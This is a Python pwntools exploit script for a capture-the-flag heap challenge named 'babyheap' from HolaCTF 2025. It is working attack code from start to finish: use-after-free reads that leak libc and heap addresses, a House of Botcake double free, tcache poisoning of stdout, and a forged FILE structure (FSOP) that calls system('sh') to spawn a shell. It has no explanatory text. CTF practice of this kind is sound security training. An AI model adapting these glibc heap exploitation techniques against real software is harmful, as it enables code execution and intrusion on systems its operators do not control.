#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = """
init-pwndbg
set solib-search-path /home/kurlz/ctf/2025/holactf/babyheap/babyheap/build/
continue
"""

libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")
exe = "././chall_patched"
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
info = lambda msg: log.info(msg)
recvunt = lambda msg: io.recvuntil(msg)

# ===================EXPLOIT GOES HERE=======================

# io = start()
# io = remote(wss://holactf2025.ehc-fptu.club/api/proxy/0198fafa-5c3b-7ee6-a637-0418424c937d)

def add(idx, size, data):
    sla(b"> ", b"1")
    sla(b"book: ", str(idx).encode())
    sla(b"book: ", str(size).encode())
    sla(b"book: ", data)

def dele(idx):
    sla(b"> ", b"2")
    sla(b"book: ", str(idx).encode())

def view(idx):
    sla(b"> ", b"3")
    sla(b"book: ", str(idx).encode())


# Leak libc
add(0, 0x420, b"A" * 8)
add(1, 0x420, b'B' * 8)

dele(0)
add(0, 0x420, b"E" * 7)

view(0)
io.recvline()
libc_leak = u64(io.recv(6).ljust(8, b'\x00'))
libc.address = libc_leak - 0x21ace0
info(hex(libc.address))

dele(0)
dele(1)

# Leak heap
add(0, 0x420, b"A" * 8)
add(1, 0x10, b'B' * 8)
add(2, 0x420, b'C' * 8)
add(3, 0x10, b'D' * 8)

dele(0)
dele(2)

add(0, 0x420, b"E" * 7)
view(0)
io.recvline()
heap_leak = u64(io.recv(6).ljust(8, b'\x00'))
heap = heap_leak - 0x6e0
info(hex(heap))
add(2, 0x420, b'C' * 8)

# House of Botcake

for i in range(7):
    add(i, 0x100, (str(i) * 8))

add(7, 0x100, b"A" * 8)
add(8, 0x100, b"B" * 8)
add(9, 0x10, b"C" * 8)

for i in range(7):
    dele(i)

dele(8)
dele(7)

add(0, 0x100, b"D" * 8)

dele(8)

# Tcache poisoning
target = libc.address + 0x21b780 #stdout
pos = heap + 0x13c0
add(7, 0x210, b"A" * 0x108 + p64(0x111) + p64(target ^ (pos >> 12)))

add(8, 0x100, b"F" * 0x10)

# FSOP
_IO_2_1_stdout_ = target
system = libc.symbols['system']
fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = system
fp._lock = _IO_2_1_stdout_ + 0x50
fp._wide_data = _IO_2_1_stdout_
fp.vtable = libc.symbols['_IO_wfile_jumps'] - 0x20
payload = bytes(fp) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)

add(9, 0x100, payload)

io.interactive()

